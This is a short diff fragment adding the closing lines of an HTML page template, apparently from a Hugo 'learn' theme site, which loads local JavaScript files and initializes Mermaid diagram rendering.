+    <script src="/js/learn.js"></script>
+    <script src="/js/hugo-learn.js"></script>
+
+    <link href="/mermaid/mermaid.css" rel="stylesheet" />
+    <script src="/mermaid/mermaid.js"></script>
+    <script>
+        mermaid.initialize({ startOnLoad: true });
+    </script>
+    
+
+  </body>
+</html>
+
